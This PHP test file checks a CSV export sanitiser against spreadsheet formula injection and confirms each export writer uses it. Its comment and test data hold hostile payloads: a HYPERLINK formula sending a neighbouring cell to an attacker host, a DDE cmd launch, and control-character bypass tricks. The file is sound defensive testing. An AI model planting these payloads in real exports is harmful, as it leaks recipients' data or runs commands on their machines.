<?php

declare(strict_types=1);

/**
 * CSV / spreadsheet formula injection (CWE-1236).
 *
 * Exports carry text an ordinary user controls — employee names, organization
 * and unit names — into a file a finance or provider officer opens in Excel.
 * A cell starting with =, +, - or @ is evaluated as a formula there, so
 * `=HYPERLINK("http://attacker/"&A1,"Payslip")` set as an employee name
 * exfiltrates the row beside it when the recipient clicks.
 */
test('formula-leading cells are neutralised', function (string $payload): void {
    [$cell] = csv_safe_row([$payload]);

    // The quote is what stops Excel evaluating the cell; the original text is
    // kept intact behind it so the export stays readable.
    expect($cell)->toStartWith("'")
        ->and(substr($cell, 1))->toBe(ltrim($payload, " \t\r\n\0\x0B"));
})->with([
    '=HYPERLINK("http://attacker.example/"&A1,"Payslip")',
    '=cmd|\' /c calc\'!A0',
    '+1+1',
    '-2+3',
    '@SUM(A1:A9)',
    // A leading control character must not smuggle a formula past the check.
    chr(9).'=cmd|calc',
    chr(13).'=1+1',
]);

test('ordinary values are left untouched', function (string $value): void {
    expect(csv_safe_row([$value])[0])->toBe($value);
})->with(['Abebe Kebede', 'ORG-001', '2026-01-01', '1500.00', 'ሠራተኛ']);

test('non-string cells pass through unchanged', function (): void {
    expect(csv_safe_row([1500, null, true, 2.5]))->toBe([1500, null, true, 2.5]);
});

/* Every CSV writer in the app must route its rows through the sanitizer. */
test('every fputcsv call site sanitises its row', function (): void {
    $files = [
        'app/Services/Cafeteria/ProviderTransactionExportService.php',
        'app/Http/Controllers/ProviderPortal/Transport/TransportTransactionController.php',
        'app/Http/Controllers/Web/ServiceFeedbackController.php',
    ];

    $unsanitised = [];

    foreach ($files as $file) {
        foreach (file(dirname(__DIR__, 3).'/'.$file) as $number => $line) {
            if (! str_contains($line, 'fputcsv(')) {
                continue;
            }

            // A blank separator row carries no data and needs no escaping.
            if (preg_match('/fputcsv\(\s*\$\w+\s*,\s*\[\]\s*\)/', $line)) {
                continue;
            }

            if (! str_contains($line, 'csv_safe_row')) {
                $unsanitised[] = $file.':'.($number + 1);
            }
        }
    }

    expect($unsanitised)->toBe([]);
});
